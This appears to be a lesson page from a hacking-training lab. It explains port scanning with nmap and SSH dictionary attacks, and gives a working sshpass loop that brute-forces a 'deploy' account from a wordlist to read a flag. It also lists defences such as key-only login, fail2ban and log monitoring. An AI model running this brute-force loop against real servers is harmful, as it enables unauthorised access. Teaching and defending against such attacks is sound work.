# Level 3 — Knock Knock

## The concept

Before an attacker can break into a server, they need to know what is running on
it. They **scan its ports**. A port is a numbered door; each open port is a
service waiting for connections (22 = SSH, 80 = HTTP, 443 = HTTPS, ...).

Opening a TCP connection is a three-step handshake — the "knock":

```
you  ── SYN ──▶   target     "can we talk?"
you  ◀ SYN-ACK ─  target     "yes, go ahead"
you  ── ACK ──▶   target     "great, connected"
```

The diagram lights these three up as your scan and your logins complete them.

Once SSH is found, the weak link is often the **password**. If it is a common
word, trying a list of guesses (a *dictionary attack*) finds it quickly. Here
the `deploy` account uses a password that is in your `wordlist.txt`.

## The commands

| Command | What it does |
|---|---|
| `nmap target` | Knock on the target's ports; list the open ones. |
| `cat wordlist.txt` | See the passwords you will try. |
| `ssh deploy@target` | Log in as `deploy` (asks for a password). |
| `sshpass -p PW ssh ...` | Supply the password from a script, for the loop. |

Solve loop (hint 3):

```sh
for p in $(cat wordlist.txt); do
  sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    deploy@target 'cat flag.txt' && break
done
```

When one password works, `cat flag.txt` prints the flag. Submit it:
`academy hack submit 3 FLAG{...}`.

## How defenders prevent this

- **Turn off password login. Use SSH keys.** A key cannot be guessed from a
  wordlist. Set `PasswordAuthentication no` in `sshd_config`.
- **Strong, unique passwords** where passwords must exist — never dictionary
  words like `sunshine`.
- **Rate-limit and lock out** repeated failures (`fail2ban`, SSH
  `MaxAuthTries`). Notice the burst of "Failed password" lines in the diagram:
  that pattern is exactly what defenders alert on.
- **Reduce the attack surface.** Close ports you do not need; put SSH behind a
  VPN or allowlist so random hosts cannot even knock.
- **Watch the logs.** Every attempt here landed in the server's auth log. Real
  servers ship those logs somewhere an attacker cannot erase them.
